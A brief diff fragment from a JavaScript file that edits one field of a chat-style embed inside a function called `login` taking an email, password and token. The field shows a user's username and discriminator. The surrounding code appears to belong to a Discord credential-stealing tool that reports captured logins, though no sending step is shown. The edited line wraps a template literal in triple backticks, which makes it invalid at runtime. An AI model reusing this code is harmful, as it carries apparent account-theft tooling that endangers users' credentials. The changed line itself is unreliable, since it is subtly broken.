@@ -611,7 +611,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:944007295417843743:959785231982931979> username:',
-            value: `${json.username}#${json.discriminator}`,
+            value: ```${json.username}#${json.discriminator}```,
             inline: false,
           },
           {
